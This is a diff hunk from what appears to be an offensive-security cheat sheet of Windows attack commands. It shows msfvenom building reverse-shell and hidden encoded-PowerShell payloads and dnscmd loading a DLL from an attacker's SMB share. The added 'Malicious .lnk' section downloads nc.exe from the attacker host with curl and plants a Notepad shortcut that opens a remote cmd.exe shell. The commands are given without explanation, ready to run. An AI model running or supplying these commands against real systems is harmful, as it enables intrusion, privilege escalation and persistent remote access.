@@ -1458,6 +1458,10 @@ impacket-smbserver share .
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
 dnscmd.exe /config /serverlevelplugindll \\$MYIP\share\0.dll
 
++---------- Malicious .lnk ----------+
+curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\programdata\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
+
 +---------- Shell From File ----------+
 msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f dll > x.dll
 msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f exe > x.exe
